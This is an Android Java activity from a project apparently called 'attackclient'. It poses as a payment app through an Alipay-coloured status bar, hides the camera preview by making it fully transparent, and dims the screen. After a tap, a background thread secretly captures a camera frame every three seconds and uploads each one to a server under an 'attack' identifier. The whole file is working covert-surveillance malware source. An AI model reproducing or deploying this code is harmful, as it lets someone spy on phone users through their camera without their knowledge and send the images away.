package com.jiacyer.attackclient.control;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.hardware.camera2.CameraAccessException;
import android.os.Bundle;
import android.os.PowerManager;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.view.TextureView;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.FrameLayout;

import com.jiacyer.attackclient.R;
import com.jiacyer.attackclient.model.CameraUtil;
import com.jiacyer.attackclient.service.DetectService;
import com.jiacyer.attackclient.tools.AttackContralTools;
import com.jiacyer.attackclient.tools.HttpUtil;
import com.jiacyer.attackclient.view.RectView;

/**
 *  Created by Jiacy-PC on 2018/2/28.
 */

public class AttackActivity extends Activity {

    private TextureView textureView;
    private CameraUtil cameraUtil;
    private FrameLayout frameLayout;
    private static final String attack_head = "attack";
    private static final int attack_base = 1000;
    private int attack_id;
    private int pic_index;

    private boolean runningFlag;
    private long wait_time = 3000; // 4秒

    private static PowerManager.WakeLock wakeLock;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.attack_activity);
        Log.i("AttackActivity", "activity start");

        pic_index = 0;
        runningFlag = false;
        AttackContralTools.setAttackActivity(this);
        frameLayout = findViewById(R.id.frameLayout);
        frameLayout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
//                Toast.makeText(AttackActivity.this, "FrameLayout is clicked!", Toast.LENGTH_SHORT).show();
                startGetPic();
                changeScreenBrightness(DetectService.getBrightness());
                Window window = getWindow();
                window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
            }
        });

        textureView = findViewById(R.id.textureView2);
        textureView.setAlpha(0.0f);

        // 改变状态栏颜色
        Window window = this.getWindow();
        window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
        window.setStatusBarColor(getResources().getColor(R.color.alipayColor, null));

//        SurfaceView surfaceView = new SurfaceView(this);
//        surfaceView.getDrawingCache();

        System.out.println("Width:"+textureView.getWidth()+";Height:"+textureView.getHeight());
        Log.i("AttackActivity", "This is the end of MainActivity!");
    }

    private void changeScreenBrightness(int brightness) {
        WindowManager.LayoutParams layoutParams = getWindow().getAttributes();
        layoutParams.screenBrightness = brightness / 255.0f;
        getWindow().setAttributes(layoutParams);
    }

    private void startGetPic() {
//        if (DetectService.isSucceed()) {
        System.out.println("Width:" + textureView.getWidth() + ";Height:" + textureView.getHeight());
        if (cameraUtil == null) {
            openCamera();
            addRectView();
            attack_id = (int) (Math.random() * attack_base);

            new Thread(new Runnable() {
                @Override
                public void run() {
                    runningFlag = true;
                    while (runningFlag) {
                        synchronized (this) {
                            try {
                                wait(wait_time);
                                final Bitmap bitmap = textureView.getBitmap();
                                Log.i("Bitmap", "Width=" + bitmap.getWidth());
                                Log.i("Bitmap", "Height=" + bitmap.getHeight());
                                Log.i("Thread", "Start to upload");
                                boolean ret = HttpUtil.uploadBitmap( attack_head + attack_id, pic_index++, bitmap);
                                Log.i("Thread", "End of upload: " + ret);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }

                    }

                }
            }).start();
//        } else {
//            final Bitmap bitmap = textureView.getBitmap();
//            Log.i("Bitmap", "Width=" + bitmap.getWidth());
//            Log.i("Bitmap", "Height=" + bitmap.getHeight());
//
//            new Thread(new Runnable() {
//                @Override
//                public void run() {
//                    Log.i("Thread", "Start to upload");
//                    boolean ret = HttpUtil.uploadBitmap( attack_head + attack_id, pic_index++, bitmap);
//                    Log.i("Thread", "End of upload: " + ret);
//                }
//            }).start();
        }
//        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        changeScreenBrightness(10);
    }

    public void openCamera() {
        if (cameraUtil == null && checkCameraPermission()) {
            try {
                cameraUtil = new CameraUtil(this);
            } catch (CameraAccessException e) {
                e.printStackTrace();
            }
        } else {
            cameraUtil = null;
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 0);
//            openCamera();
        }
    }

    private boolean checkCameraPermission() {
        return  ActivityCompat.checkSelfPermission(this,
                Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (cameraUtil != null)
            cameraUtil.stopCamera();
        cameraUtil = null;
        runningFlag = false;
        DetectService.setFlag(true);
        Log.i("AttackActivity", "Activity Pause!");
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (cameraUtil != null)
            cameraUtil.stopCamera();
        cameraUtil = null;
        runningFlag = false;
        AttackContralTools.removeAttackActivity();
        Log.d("AttackActivity", "MainActivity stopped!");
    }

    public void addRectView() {
        RectView rectView = new RectView(AttackActivity.this);
//        addContentView(rectView, );
        frameLayout.addView(rectView);
    }

    public TextureView getTextureView() {
        return textureView;
    }
}
